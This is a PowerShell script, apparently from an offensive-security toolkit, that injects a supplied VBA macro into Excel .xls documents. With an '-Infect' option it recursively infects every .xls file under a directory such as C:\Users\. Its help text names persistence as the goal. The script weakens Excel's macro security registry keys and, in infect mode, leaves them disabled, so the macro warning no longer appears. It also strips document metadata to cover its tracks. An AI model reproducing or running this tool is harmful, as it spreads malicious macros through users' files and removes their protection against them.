<#
.SYNOPSIS
Inject VBA macro code into an Excel document.

Author: Brandan [coldfusion]
License: MIT
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION
Injects the supplied VBA macro code into the specified Excel document.

If the '-Infect' flag is given, the supplied VBA macro code will be injected into all '.xls' Excel documents in the specified '-Excel' directory path.
Ideally this would be used to establish a low level form of persistence.
Additionally, the Excel 'Security' registry keys are not re-enabled on exit, which disables Excel's 'Are you sure you want to run this Macro' warning.

The VBA macro code will only be injected into '.xls' Excel documents, not '.xlsx' or '.xlsm'.

.PARAMETER Excel
Path of the target Excel document or directory path.

.PARAMETER Macro
Path of the VBA macro file you want injected into the Excel document.

.PARAMETER Infect
Inject VBA macro code into all '.xls' Excel documents found in the supplied '-Excel' directory. 

.EXAMPLE
C:\PS> .\Inject-Macro.ps1 -Excel .\Excel.xls -Macro .\Macro.vba

Description
-----------
Injects the VBA macro 'Macro.vba' into the Excel document 'Excel.xls'

.EXAMPLE
C:\PS> .\Inject-Macro.ps1 -Excel C:\Users\ -Macro C:\temp\Macro.vba -Infect

Description
-----------
Injects the VBA macro 'Macro.vba' into all '.xls' Excel documents found in 'C:\Users\' recursively.
#>

[CmdletBinding()]
param(
	[Parameter(Mandatory = $True)]
	[String]
	$Excel,

	[Parameter(Mandatory = $True)]
	[String]
	$Macro,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Infect = $False
)

function Inject-Macro {
	Clear

	# Process Excel and macro file location
	$Excel = (Resolve-Path $Excel).Path 
	$Macro = (Resolve-Path $Macro).Path

	# Create Excel objects
	Add-Type -AssemblyName Microsoft.Office.Interop.Excel
	$XLS = New-Object -ComObject Excel.Application
	$ExcelVersion = $XLS.Version

	# Disable macro security, YES this is needed to inject the macro, (it gets re-enabled below)
	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

	$XLS.DisplayAlerts = "wdAlertsNone"
	$XLS.DisplayAlerts = $False
	$XLS.Visible = $False
	$XLS.ScreenUpdating = $False
	$XLS.UserControl = $False
	$XLS.Interactive = $False

	# Inject macro into a single Excel file
	if ($Infect -eq $False) {
		if ((Test-Path $Excel -pathType container) -eq $False) {
			$Output = $Excel
			$Workbook = $XLS.Workbooks.Open($Excel)
			$VBA = $Workbook.VBProject.VBComponents.Add(1)
			$VBA.CodeModule.AddFromFile($Macro) | Out-Null

			# Sanatize document metadata
			$RemoveMetadata = "Microsoft.Office.Interop.Excel.XlRemoveDocInfoType" -as [type]
			$Workbook.RemoveDocumentInformation($RemoveMetadata::xlRDIAll) 

			# Save the document
			$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
			$XLS.Workbooks.Close()

			# Enable macro security
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

			Write-Host "Macro sucessfully injected into $Output"
		} else {
			Write-Host "Please provide a valid Excel file!" -foregroundcolor red
			exit
		}

	# Inject macro into multiple Excel files
	} else {
		if ((Test-Path $Excel -pathType container) -eq $True) {
			Write-Host "Infecting..."
			$ExcelFiles = Get-ChildItem -Path $Excel -include *.xls -recurse

			ForEach ($ExcelFile in $ExcelFiles) {
				$Output = $ExcelFile
				$Workbook = $XLS.Workbooks.Open($ExcelFile)
				$VBA = $Workbook.VBProject.VBComponents.Add(1)
				$VBA.CodeModule.AddFromFile($Macro) | Out-Null

				# Sanatize document metadata
				$RemoveMetadata = "Microsoft.Office.Interop.Excel.XlRemoveDocInfoType" -as [type]
				$Workbook.RemoveDocumentInformation($RemoveMetadata::xlRDIAll) 

				# Save the document
				$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
				$XLS.Workbooks.Close()

				Write-Host "Macro sucessfully injected into $ExcelFile"
			}
		} else {
			Write-Host "Please provide a valid directory path!" -foregroundcolor red
			exit
		}
	}

	# Clean up before exiting
	$XLS.Quit()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($XLS) | out-null
	$XLS = $Null

	if (ps excel) {
		kill -name excel
	}

	if ($Infect -eq $False) {
		Write-Host "Remember, the injected VBA macro is NOT password protected!" -foregroundcolor red
	} else {
		Write-Host "All found Excel files have been injected" -foregroundcolor green
	}
}

Inject-Macro -Excel $Excel -Macro $Macro
